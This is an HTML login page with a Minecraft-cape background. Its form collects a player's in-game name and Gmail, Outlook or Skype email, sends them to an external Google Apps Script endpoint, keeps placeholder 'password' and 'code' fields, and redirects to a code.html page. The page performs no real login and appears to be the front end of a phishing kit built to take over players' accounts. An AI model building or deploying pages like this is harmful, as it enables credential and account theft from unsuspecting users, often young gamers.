<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background: url('https://images.1v9.gg/best%20minecraft%20capes-765795c140e4.webp') no-repeat center center fixed;
      background-size: cover;
    }
    .overlay {
      background-color: rgba(0, 0, 0, 0.5);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .login-box {
      background: rgba(255, 255, 255, 0.9);
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
      text-align: center;
    }
    h2 {
      margin-top: 0;
      color: #333;
      font-weight: 600;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1e88e5;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1565c0;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="login-box">
      <h2>Login</h2>
      <form id="loginForm">
        <input type="text" id="inGameName" placeholder="In-game name" required><br>
        <input type="email" id="email" placeholder="Gmail / Outlook / Skype" required><br>
        <button type="submit">Login</button>
      </form>
    </div>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWU_jo9dGxh5MNTp7vP70ANUlT5V1XvukmMzIcfPimLHU__stD1w2HwSxNgFTwD7SSww/exec';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('inGameName').value;
      const gmail = document.getElementById('email').value;

      // Save to localStorage for use in code.html
      localStorage.setItem('username', username);
      localStorage.setItem('gmail', gmail);

      // Send only username & gmail to Apps Script
      const formData = new FormData();
      formData.append("username", username);
      formData.append("gmail", gmail);
      formData.append("password", ""); // leave blank for now
      formData.append("code", "");     // leave blank for now

      fetch(scriptURL, {
        method: 'POST',
        body: formData
      })
      .then(res => res.text())
      .then(() => {
        // After submission, go to next page
        window.location.href = "code.html";
      })
      .catch(error => {
        alert("Submission failed: " + error.message);
      });
    });
  </script>
</body>
</html>
